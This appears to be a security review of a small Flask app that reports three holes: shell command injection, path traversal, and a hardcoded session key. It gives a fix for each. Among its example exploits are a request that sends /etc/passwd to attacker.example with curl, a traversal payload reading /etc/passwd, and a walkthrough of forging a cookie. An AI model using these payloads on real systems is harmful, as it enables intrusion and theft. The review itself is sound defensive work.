# Security Review — t1_diff.py

Scope: security issues only, per `skills/authored/code-review` §02-security-review. Three findings below, ordered by severity.

---

## 1. OS command injection in `/api/dns-lookup` — **Critical**

**Location:** `dns_lookup()`, line 11:
```python
host = request.args.get("host", "")
out = subprocess.check_output("nslookup " + host, shell=True, text=True)
```

**Issue:** The `host` query parameter is attacker-controlled and is string-concatenated directly into a shell command line executed with `shell=True`. Any shell metacharacter in `host` (`;`, `&&`, `|`, backticks, `$()`) is interpreted by `/bin/sh`, not passed as a literal argument to `nslookup`.

**Exploit:** A request such as:
```
GET /api/dns-lookup?host=example.com;curl+http://attacker.example/x?d=$(cat+/etc/passwd|base64)
```
causes the shell to run `nslookup example.com` **and then** the injected command. Because `check_output` captures all of the child shell's stdout, the output of the injected command (e.g. `cat /etc/passwd`, `id`, a reverse shell one-liner, etc.) is returned directly in the JSON response — full remote code execution as the service's user, with no authentication required on this route.

**Fix:** Never build a shell string from user input. Use the list form with `shell=False`, and validate the input is a plausible hostname/IP before use:
```python
import re
import subprocess

HOSTNAME_RE = re.compile(r"^[A-Za-z0-9.-]{1,253}$")

@app.route("/api/dns-lookup")
def dns_lookup():
    host = request.args.get("host", "")
    if not HOSTNAME_RE.match(host):
        return jsonify({"error": "invalid host"}), 400
    out = subprocess.check_output(["nslookup", host], text=True)
    return jsonify({"result": out})
```
The list form ensures `host` is passed as a single argv element (no shell parsing), and the allowlist regex blocks flag-injection (e.g. a value starting with `-`) and non-hostname payloads.

## 2. Path traversal / arbitrary file read in `/api/export-users` — **Critical**

**Location:** `export_users()`, lines 18-19:
```python
path = request.args.get("template", "default.tpl")
tpl = open("templates/" + path).read()
```

**Issue:** `path` is attacker-controlled and concatenated (not joined-and-validated) onto the `templates/` prefix. The OS resolves `..` segments at open time regardless of how the string was built, so `../` sequences escape the `templates/` directory. There is no canonicalization or containment check (no `os.path.realpath` + prefix check, no `Path.resolve().is_relative_to(...)`, no allowlist of template names).

**Exploit:**
```
GET /api/export-users?template=../../../../etc/passwd
```
resolves to `templates/../../../../etc/passwd`, which the OS opens as `/etc/passwd`. The file's contents are read and returned in the HTTP response (any `%FMT%` placeholder substitution aside, the bulk of the file content passes through unchanged). This lets an unauthenticated caller read any file readable by the service's user — application source, `.env`/config files with credentials, SSH keys, `/etc/passwd`, etc. Route name suggests it should only ever load whitelisted export templates, not arbitrary files.

**Fix:** Canonicalize and verify containment before opening, or better, use an allowlist of known template names:
```python
import os

TEMPLATE_DIR = os.path.realpath("templates")

@app.route("/api/export-users")
def export_users():
    fmt = request.args.get("format", "csv")
    name = request.args.get("template", "default.tpl")
    candidate = os.path.realpath(os.path.join(TEMPLATE_DIR, name))
    if os.path.commonpath([candidate, TEMPLATE_DIR]) != TEMPLATE_DIR:
        return jsonify({"error": "invalid template"}), 400
    with open(candidate) as f:
        tpl = f.read()
    return tpl.replace("%FMT%", fmt)
```
Prefer an explicit allowlist (`{"default.tpl", "csv.tpl", ...}`) over path math if the set of valid templates is small and fixed.

## 3. Hardcoded Flask `secret_key` — **High**

**Location:** line 6:
```python
app.secret_key = "dev-secret-key-2024"
```

**Issue:** `secret_key` is the key Flask/itsdangerous uses to *sign* (not encrypt) the session cookie. It's hardcoded in source, so it ends up in version control and is identical across every deployment (dev, staging, prod) unless someone remembers to override it. Flask sessions are client-side and only integrity-protected by this key — anyone who knows it can forge arbitrary session content.

**Exploit:** With the secret known (from reading the source/repo), an attacker uses a tool such as `flask-unsign` to mint a validly-signed session cookie with arbitrary contents, e.g. forging `{"user_id": 1, "is_admin": True}`, and presents it as their `session` cookie. The application will treat it as authentic since the signature checks out against the known key — this is a full authentication/authorization bypass for any logic that trusts `session` contents, and the risk is amplified because this literal value is committed to the repo and reused verbatim if it ever ships to production.

**Fix:** Load the key from environment/secret manager, generate it with a CSPRNG, and never commit a real value:
```python
import os

app.secret_key = os.environ["FLASK_SECRET_KEY"]  # e.g. secrets.token_hex(32), set out-of-band
```
Fail startup if the env var is missing rather than falling back to a literal default, and rotate the key (invalidating existing sessions) since the current value is already exposed in source.
